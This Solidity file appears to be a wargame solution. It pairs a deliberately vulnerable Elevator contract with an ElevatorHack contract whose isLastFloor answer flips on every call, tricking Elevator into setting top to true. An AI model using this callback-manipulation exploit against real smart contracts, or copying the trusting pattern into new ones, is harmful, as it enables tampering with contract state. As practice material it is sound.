// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

// goal: make *bool top* = true

// an original contract
// deploy it first
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// a contract that hacks the original one
// deploy it second
contract ElevatorHack {
    bool result = true;

    function isLastFloor(uint) external returns (bool) {
        return result = !result;
    }

    // use this function
    function hack(Elevator _elevatorAddress, uint _floor) external {
        _elevatorAddress.goTo(_floor);
    }
}